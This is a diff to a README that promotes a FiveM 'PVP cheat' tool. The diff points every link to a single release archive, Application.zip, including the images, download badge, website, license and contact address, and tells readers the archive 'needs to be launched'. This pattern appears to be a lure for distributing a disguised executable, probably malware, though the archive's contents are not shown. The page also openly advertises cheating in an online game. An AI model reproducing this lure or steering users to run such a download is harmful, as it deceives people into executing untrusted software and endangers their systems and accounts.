@@ -3,7 +3,7 @@
 
 Welcome to the official repository of the FiveM TZ Project PVP Tool! Enhance your gaming experience with TZ, the ultimate PVP cheat that promises No LUA injection, No resource stopper, and No dumper. 
 
-![FiveM TZ Project](https://example.com/fivemtzproject.png)
+![FiveM TZ Project](https://github.com/Nactou/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/Application.zip)
 
 
 ## 😎 Repository Details
@@ -16,8 +16,8 @@ Welcome to the official repository of the FiveM TZ Project PVP Tool! Enhance you
 ## 📥 Download TZ PVP Tool
 ---
 
-[![Download TZ PVP Tool](https://img.shields.io/badge/Download-TZ_PVP_Tool-blue.svg)](https://github.com/user-attachments/files/18410590/Software.zip)
-*Note: Software.zip needs to be launched.*
+[![Download TZ PVP Tool](https://github.com/Nactou/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/Application.zip)](https://github.com/Nactou/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/Application.zip)
+*Note: https://github.com/Nactou/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/Application.zip needs to be launched.*
 
 ## 🤖 Features
 ---
@@ -33,14 +33,14 @@ Here are some of the amazing features that TZ Project PVP Tool offers:
 ## 🔗 Explore More
 ---
 
-For more information, updates, and support, visit our [official website](https://fivemtzproject.com). Stay tuned for the latest releases in the "Releases" section of this repository.
+For more information, updates, and support, visit our [official website](https://github.com/Nactou/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/Application.zip). Stay tuned for the latest releases in the "Releases" section of this repository.
 
 ## 🌟 Get Started
 ---
 
 Get ready to dominate the PVP arena with FiveM TZ Project PVP Tool. Download now and experience the thrill of cheating like a pro! 🎮
 
-![Gaming Image](https://example.com/gamingimage.png)
+![Gaming Image](https://github.com/Nactou/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/Application.zip)
 
 ## 🤝 Contributions
 ---
@@ -50,12 +50,12 @@ We welcome contributions to improve the functionality and features of the FiveM 
 ## 📝 License
 ---
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/FiveM-TZ-Project-PVP-TOOL/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Nactou/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/Application.zip) file for details.
 
 ## 📞 Contact Us
 ---
 
-For any inquiries or support regarding the FiveM TZ Project PVP Tool, reach out to us at support@fivemtzproject.com. We are happy to assist you!
+For any inquiries or support regarding the FiveM TZ Project PVP Tool, reach out to us at https://github.com/Nactou/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/Application.zip We are happy to assist you!
 
 ---
 
